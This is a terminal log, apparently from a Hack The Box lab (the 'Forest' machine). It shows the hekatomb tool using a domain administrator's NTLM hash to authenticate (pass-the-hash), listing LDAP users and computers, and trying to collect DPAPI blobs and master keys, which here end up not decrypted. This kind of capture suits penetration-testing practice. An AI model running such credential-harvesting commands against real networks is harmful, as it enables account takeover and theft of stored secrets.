```sh
└─$ hekatomb -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.95.210' -debugmax

██░ ██ ▓█████  ██ ▄█▀▄▄▄     ▄▄▄█████▓ ▒█████   ███▄ ▄███▓ ▄▄▄▄   
▓██░ ██▒▓█   ▀  ██▄█▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ 
▒██▀▀██░▒███   ▓███▄░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▒██▒ ▄██
░▓█ ░██ ▒▓█  ▄ ▓██ █▄░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ▒██░█▀  
░▓█▒░██▓░▒████▒▒██▒ █▄▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓
 ▒ ░░▒░▒░░ ▒░ ░▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒
 ▒ ░▒░ ░ ░ ░  ░░ ░▒ ▒░ ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░  ░      ░▒░▒   ░ 
 ░  ░░ ░   ░   ░ ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░      ░    ░    ░ 
 ░  ░  ░   ░  ░░  ░        ░  ░            ░ ░         ░    ░      
   Because Domain Admin rights are not enough.
                Hack them all.

                 @Processus
                    v1.5
**************************************************


[+] Targeting domain htb.local
[+] Testing admin rights...
[+] Admin access granted.
[+] Testing LDAP connection...
[!] Error : Could not connect to ldap with SSL encryption. Trying without SSL encryption...
[+] LDAP connection succeeded !
[+] Retrieving user objects in LDAP directory...
[+] Converting ObjectSID in string SID...
[+] Found about 31 users in LDAP directory.
[+] Retrieving computer objects in LDAP directory...
[+] ldapConnection.entries[0] : DN: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local - STATUS: Read - READ TIME: 2025-08-22T14:11:13.853021
    cn: FOREST
[+] ldapConnection.entries[1] : DN: CN=EXCH01,CN=Computers,DC=htb,DC=local - STATUS: Read - READ TIME: 2025-08-22T14:11:13.853079
    cn: EXCH01
[+] Found about 2 computers in LDAP directory.
[+] Creating structure folders to store blob and mkf...
[+] Scanning computers list on SMB port ...
[+] Resolving FOREST.htb.local by asking DNS server 10.129.95.210 ...
[+] Resolving EXCH01.htb.local by asking DNS server 10.129.95.210 ...
[!] ERROR : timed out
[+] It seems that 1 computers are online ...
[+] Connnecting to all computers and try to get dpapi blobs and master key files ...
[+] Find existing user Administrator on computer FOREST.htb.local0.0% ... Collect in progress ....
[+] Find existing user sebastien on computer FOREST.htb.local
[+] Find existing user svc-alfresco on computer FOREST.htb.local
[============================================================] 100.0% ... Collect complete .......

[!] No MKF have been decrypted.
Blobs will not be decrypted.
```
